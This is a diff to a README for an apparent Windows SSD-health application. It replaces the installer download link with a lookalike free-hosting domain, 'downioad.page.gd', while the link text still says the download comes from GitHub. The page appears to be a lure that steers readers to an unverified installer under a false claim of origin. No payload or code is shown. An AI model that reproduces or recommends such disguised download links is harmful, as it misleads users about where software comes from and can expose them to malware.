@@ -2,7 +2,7 @@
 
 SSDlife 2026 Enhanced Suite is a powerful Windows desktop application designed for monitoring and optimizing the health and performance of solid-state drives. This tool provides users with detailed insights into their SSDs, ensuring longevity and efficiency through real-time data tracking and advanced features. Released in 2026, it incorporates the latest technologies to deliver accurate diagnostics and user-friendly management for Windows 10 and 11 systems.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -70,6 +70,6 @@ For the latest updates, documentation, and community support, please visit the o
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *Ensure you always download software from official sources to maintain security and receive verified updates.*
